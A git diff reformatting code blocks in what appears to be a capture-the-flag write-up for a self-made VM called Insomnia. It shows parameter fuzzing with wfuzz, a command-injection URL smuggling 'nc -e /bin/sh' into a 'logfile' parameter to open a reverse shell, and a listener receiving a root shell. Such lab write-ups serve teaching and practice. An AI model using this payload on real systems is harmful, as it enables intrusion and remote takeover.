@@ -25,18 +25,15 @@ title:  "Case Study : Insomnia"
 
 ## Find GET parameter
 
-{% highlight sh %}
-  wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hh 65 'http://10.0.2.114:8080/administration.php?FUZZ=test'                                                               
-  =====================================================================
-  ID           Response   Lines    Word       Chars       Payload                                                                                                                                            
-  =====================================================================
+```sh
+wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hh 65 'http://10.0.2.114:8080/administration.php?FUZZ=test'
 
-  000000485:   200        2 L      12 W       69 Ch       "logfile"    
-{% endhighlight %}
+"logfile" 
+```
 
 ## Reverse shell
 
-```
+```sh
 http://10.0.2.114:8080/administration.php?logfile=chat.txt;nc -e /bin/sh 10.0.2.15 4444
 ```
 
@@ -116,12 +113,11 @@ http://10.0.2.114:8080/administration.php?logfile=chat.txt;nc -e /bin/sh 10.0.2.
 ## My machine, wait a little bit
 
 {% highlight sh %}
-  ┌──(alienum㉿kali)-[~]
-  └─$ nc -lvp 5555
-  listening on [any] 5555 ...
-  connect to [10.0.2.15] from 10.0.2.114 [10.0.2.114] 40348
-  id
-  uid=0(root) gid=0(root) groups=0(root)
+nc -lvp 5555
+listening on [any] 5555 ...
+connect to [10.0.2.15] from 10.0.2.114 [10.0.2.114] 40348
+id
+uid=0(root) gid=0(root) groups=0(root)
 {% endhighlight %}
 
 - This vm created by me, i enjoyed the process
